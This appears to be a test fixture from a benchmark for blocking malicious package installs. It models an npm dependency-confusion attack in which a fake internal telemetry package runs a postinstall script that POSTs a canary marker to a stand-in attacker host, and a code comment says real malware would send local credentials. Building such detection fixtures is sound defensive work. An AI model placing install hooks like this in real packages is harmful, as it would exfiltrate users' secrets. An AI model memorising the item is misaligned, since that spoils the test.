@@ -1,0 +1,21 @@
+{
+  "id": "npm-postinstall-beacon",
+  "title": "npm postinstall script beacons during install (dependency-confusion shape)",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "An internal-looking package runs a postinstall lifecycle script that executes attacker code the moment it is installed as a dependency.",
+  "trigger": "npm install",
+  "incident": "Dependency-confusion / Shai-Hulud class (install-time beacons via lifecycle scripts)",
+  "sources": [
+    "https://socket.dev/glossary/shai-hulud",
+    "https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies"
+  ],
+  "notes": "postinstall runs scripts/postinstall.js, an inert JS beacon (console.log PAH-CANARY); reserved .invalid collector, never executed.",
+  "files": {
+    "package.json": "{\n  \"name\": \"@acme-internal/telemetry\",\n  \"version\": \"9.9.9\",\n  \"scripts\": {\n    \"postinstall\": \"node scripts/postinstall.js\",\n    \"test\": \"echo ok\"\n  }\n}\n",
+    "scripts/postinstall.js": "// PAH-CANARY benchmark fixture -- inert stand-in for an install-time beacon.\n// Real malware would read local credentials and POST them to the collector;\n// this fixture only sends the canary marker to a reserved .invalid host.\ntry {\n  const https = require('https');\n  const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });\n  req.on('error', () => {});\n  req.write('marker=PAH-CANARY');\n  req.end();\n} catch (e) {}\nconsole.log('PAH-CANARY');\n",
+    "index.js": "module.exports = { track: () => {} };\n",
+    "README.md": "# @acme-internal/telemetry\n\nInternal telemetry shim.\n"
+  }
+}
